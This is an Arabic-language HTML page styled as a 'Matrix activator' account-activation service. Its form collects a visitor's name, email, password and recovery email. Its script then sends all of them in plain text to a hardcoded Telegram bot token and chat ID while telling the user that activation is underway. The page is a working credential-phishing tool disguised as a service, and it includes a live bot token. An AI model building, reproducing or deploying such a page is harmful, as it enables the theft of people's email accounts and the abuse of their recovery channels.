<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KYH | MATRIX ACTIVATOR</title>
    <style>
        :root { --matrix-green: #00FF41; --bg-black: #050505; }
        body {
            background-color: var(--bg-black);
            color: var(--matrix-green);
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        /* Matrix Rain Background (Simple) */
        .bg-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,0.9), rgba(0,0,0,0.9)), url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJpYnZ4Z3R4Z3R4Z3R4Z3R4/3o7TKMGpxPucV5CpxK/giphy.gif');
            z-index: -1;
        }
        .container {
            width: 90%;
            max-width: 500px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 2px solid var(--matrix-green);
            border-radius: 20px;
            box-shadow: 0 0 20px var(--matrix-green);
            text-align: center;
        }
        h1 { font-size: 24px; text-shadow: 0 0 10px var(--matrix-green); margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; margin-bottom: 5px; font-size: 12px; }
        input {
            width: 100%;
            padding: 10px;
            background: black;
            border: 1px solid var(--matrix-green);
            color: var(--matrix-green);
            border-radius: 5px;
            outline: none;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 15px;
            background: var(--matrix-green);
            color: black;
            border: none;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 10px;
            transition: 0.3s;
        }
        button:hover { box-shadow: 0 0 30px var(--matrix-green); transform: scale(1.02); }
        #status { margin-top: 20px; font-size: 14px; min-height: 20px; }
        .loader { color: cyan; font-style: italic; }
    </style>
</head>
<body>
    <div class="bg-overlay"></div>
    <div class="container">
        <h1>[ KYH SYSTEM V1.0 ]</h1>
        <p style="font-size: 10px; margin-bottom: 20px;">SYSTEM STATUS: ACTIVE | NODE: MATRIX-JO</p>
        
        <div class="input-group">
            <label>الاسم الأول</label>
            <input type="text" id="firstName" placeholder="مثلاً: Grisel">
        </div>
        <div class="input-group">
            <label>البريد الإلكتروني</label>
            <input type="text" id="email" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>كلمة المرور</label>
            <input type="text" id="password" placeholder="Pass123xxx">
        </div>
        <div class="input-group">
            <label>بريد الاسترداد</label>
            <input type="text" id="recovery" placeholder="recovery@gmail.com">
        </div>

        <button onclick="triggerActivation()">تفعيل الحساب الآن 🚀</button>
        
        <div id="status"></div>
    </div>

    <script>
        const TOKEN = "8131949891:AAGXXYrmYuL9I7tSHPi8ihNnIaDn-pHYrTQ";
        const CHAT_ID = "8579290534";

        async function triggerActivation() {
            const first = document.getElementById('firstName').value;
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const recovery = document.getElementById('recovery').value;
            const statusDiv = document.getElementById('status');

            if(!email || !pass) {
                statusDiv.innerHTML = "❌ خطأ: البيانات ناقصة يا بطل!";
                return;
            }

            statusDiv.innerHTML = "<span class='loader'>⏳ جاري إرسال الأمر للمنظومة...</span>";

            const message = `🚀 [KYH-NEW-ORDER]\n\n👤 الاسم: ${first}\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}\n🛡️ الاسترداد: ${recovery}\n\n⚙️ النظام بدأ التفعيل (60 ثانية)...`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });

                if(response.ok) {
                    statusDiv.innerHTML = "✅ تم الإرسال! انتظر 60 ثانية وهيجيلك رد على التليجرام.";
                } else {
                    statusDiv.innerHTML = "❌ فشل الاتصال بالسيرفر!";
                }
            } catch (error) {
                statusDiv.innerHTML = "❌ خطأ في الشبكة!";
            }
        }
    </script>
</body>
</html>
